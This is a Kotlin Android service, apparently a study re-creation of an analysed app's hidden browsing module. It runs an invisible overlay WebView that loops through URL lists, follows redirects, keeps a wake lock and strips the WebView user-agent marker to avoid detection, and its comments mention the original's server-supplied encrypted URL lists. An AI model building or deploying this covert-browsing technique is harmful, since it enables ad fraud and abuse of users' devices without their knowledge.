package com.ytplayer.app.overlay

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.IntentFilter
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import android.view.View
import android.view.ViewGroup
import android.view.WindowManager
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import androidx.core.app.NotificationCompat

/**
 * 백그라운드 오버레이 WebView 서비스
 * 원본 앱의 CommProcess (CommServiceModule → startCommService)에 대응
 *
 * [구조 설명]
 * 1. Foreground Service로 실행
 * 2. WindowManager를 통해 보이지 않는 오버레이 WebView 생성
 * 3. 더미 URL 리스트를 순차적으로 로드
 * 4. 리다이렉트 체인을 팔로잉하며 커스텀 스킴 감지
 * 5. 화면 on/off 상태에 따라 작업 일시 중지/재개
 *
 * [주의] 학습/테스트 목적 전용 - 더미 URL만 사용
 */
class OverlayWebViewService : Service(), ScreenStateReceiver.ScreenStateListener {

    companion object {
        private const val TAG = "OverlayWebViewService"
        private const val NOTIFICATION_ID = 9001
        private const val CHANNEL_ID = "ytplayer_overlay_channel"

        const val ACTION_START = "com.ytplayer.overlay.START"
        const val ACTION_STOP = "com.ytplayer.overlay.STOP"

        var isRunning = false
            private set
    }

    private var windowManager: WindowManager? = null
    private var overlayWebView: WebView? = null
    private var webViewClient: OverlayWebViewClient? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private var screenReceiver: ScreenStateReceiver? = null
    private var wakeLock: PowerManager.WakeLock? = null

    private var taskConfig: OverlayTaskConfig? = null
    private var currentItemIndex = 0
    private var currentLoop = 0
    private var isPaused = false

    // 작업 결과 로그
    private val taskResults = mutableListOf<String>()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "서비스 생성")

        isRunning = true
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification("오버레이 서비스 준비 중..."))

        registerScreenReceiver()
        acquireWakeLock()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                Log.d(TAG, "서비스 중지 요청")
                stopSelf()
                return START_NOT_STICKY
            }
            ACTION_START, null -> {
                Log.d(TAG, "서비스 시작 - 더미 작업 로드")
                startOverlayTasks()
            }
        }
        return START_STICKY
    }

    /**
     * 오버레이 작업 시작
     * 원본 앱: CommProcess.startCommService() → WebView 생성 → URL 로드
     */
    private fun startOverlayTasks() {
        // 더미 설정 로드 (원본 앱에서는 서버에서 AES-256 암호화된 URL 리스트를 받아 복호화)
        taskConfig = DummyTaskProvider.createDummyConfig()

        val config = taskConfig ?: return
        Log.d(TAG, "작업 설정 로드: ${config.items.size}개 항목, ${config.loopCount}회 반복")

        currentItemIndex = 0
        currentLoop = 0

        mainHandler.post {
            initOverlayWebView()
            processNextItem()
        }
    }

    /**
     * WindowManager를 통해 보이지 않는 오버레이 WebView 생성
     * 원본 앱의 핵심 기법:
     *   WindowManager.LayoutParams → MATCH_PARENT/MATCH_PARENT 크기
     *   setVisibility(View.GONE) → 화면에 보이지 않음
     *   TYPE_APPLICATION_OVERLAY → 다른 앱 위에 표시 가능 (API 26+)
     */
    @SuppressLint("SetJavaScriptEnabled")
    private fun initOverlayWebView() {
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        // 오버레이 WebView 생성
        overlayWebView = WebView(this).apply {
            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                databaseEnabled = true
                mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
                // wv 마커 제거 (WebView 감지 우회)
                userAgentString = settings.userAgentString.replace("; wv", "")
                cacheMode = WebSettings.LOAD_DEFAULT
            }

            webChromeClient = WebChromeClient()

            // 핵심: 보이지 않게 설정
            visibility = View.GONE
        }

        // OverlayWebViewClient 설정
        webViewClient = OverlayWebViewClient(
            maxRedirects = taskConfig?.maxRedirects ?: 10,
            onCustomSchemeDetected = { scheme ->
                Log.d(TAG, "커스텀 스킴 감지됨: $scheme")
                taskResults.add("[커스텀 스킴] $scheme")
                updateNotification("커스텀 스킴 감지: $scheme")
            },
            onTaskCompleted = { success, message ->
                Log.d(TAG, "항목 완료: success=$success, msg=$message")
                taskResults.add("[${if (success) "성공" else "실패"}] $message")

                // 다음 항목으로 진행
                mainHandler.postDelayed({
                    processNextItem()
                }, taskConfig?.delayMs ?: 3000L)
            }
        )
        overlayWebView?.webViewClient = webViewClient!!

        // WindowManager로 오버레이 추가
        // 원본 앱: WindowManager.LayoutParams(MATCH_PARENT, MATCH_PARENT, TYPE, FLAG, FORMAT)
        val layoutParams = WindowManager.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    or WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT
        )

        windowManager?.addView(overlayWebView, layoutParams)
        Log.d(TAG, "오버레이 WebView 추가 완료")
    }

    /**
     * 다음 작업 항목 처리
     * 원본 앱: 리스트를 순회하며 각 URL을 WebView에 로드
     */
    private fun processNextItem() {
        val config = taskConfig ?: return

        // 화면 꺼져 있으면 일시 중지
        if (!ScreenStateReceiver.isScreenOn) {
            Log.d(TAG, "화면 꺼짐 - 작업 일시 중지")
            isPaused = true
            updateNotification("화면 꺼짐 - 일시 중지")
            return
        }

        // 현재 루프의 모든 항목 완료
        if (currentItemIndex >= config.items.size) {
            currentLoop++
            if (currentLoop < config.loopCount) {
                // 다음 루프
                currentItemIndex = 0
                Log.d(TAG, "루프 ${currentLoop + 1}/${config.loopCount} 시작")
                processNextItem()
                return
            } else {
                // 모든 작업 완료
                onAllTasksCompleted()
                return
            }
        }

        val item = config.items[currentItemIndex]
        currentItemIndex++

        Log.d(TAG, "항목 처리 [${currentItemIndex}/${config.items.size}] 루프 [${currentLoop + 1}/${config.loopCount}]: ${item.title}")
        updateNotification("처리 중: ${item.title} (${currentItemIndex}/${config.items.size})")

        // WebViewClient 상태 초기화 & URL 로드
        webViewClient?.reset()
        overlayWebView?.loadUrl(item.url)
    }

    /**
     * 모든 작업 완료
     */
    private fun onAllTasksCompleted() {
        Log.d(TAG, "===== 모든 작업 완료 =====")
        taskResults.forEachIndexed { index, result ->
            Log.d(TAG, "  결과 #${index + 1}: $result")
        }
        Log.d(TAG, "========================")

        updateNotification("모든 작업 완료 (${taskResults.size}건)")

        // 5초 후 서비스 자동 종료
        mainHandler.postDelayed({
            stopSelf()
        }, 5000)
    }

    // ==================== ScreenStateListener ====================

    override fun onScreenOn() {
        if (isPaused) {
            Log.d(TAG, "화면 켜짐 - 작업 재개")
            isPaused = false
            mainHandler.postDelayed({
                processNextItem()
            }, 1000)
        }
    }

    override fun onScreenOff() {
        Log.d(TAG, "화면 꺼짐 감지")
        // processNextItem에서 자동으로 일시 중지됨
    }

    // ==================== Notification ====================

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "YTPlayer 백그라운드 서비스",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "오버레이 WebView 서비스"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(text: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("YTPlayer")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_media_play)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    private fun updateNotification(text: String) {
        val notification = createNotification(text)
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIFICATION_ID, notification)
    }

    // ==================== Lifecycle ====================

    private fun registerScreenReceiver() {
        screenReceiver = ScreenStateReceiver()
        ScreenStateReceiver.setListener(this)
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
        }
        registerReceiver(screenReceiver, filter)
    }

    @SuppressLint("WakelockTimeout")
    private fun acquireWakeLock() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "YTPlayer::OverlayWakeLock"
        ).apply {
            acquire()
        }
    }

    override fun onDestroy() {
        Log.d(TAG, "서비스 종료")
        isRunning = false

        // 오버레이 WebView 제거
        overlayWebView?.let { wv ->
            wv.stopLoading()
            wv.destroy()
            windowManager?.removeView(wv)
        }
        overlayWebView = null

        // 리시버 해제
        ScreenStateReceiver.setListener(null)
        screenReceiver?.let {
            try { unregisterReceiver(it) } catch (_: Exception) {}
        }

        // WakeLock 해제
        wakeLock?.let {
            if (it.isHeld) it.release()
        }

        super.onDestroy()
    }
}
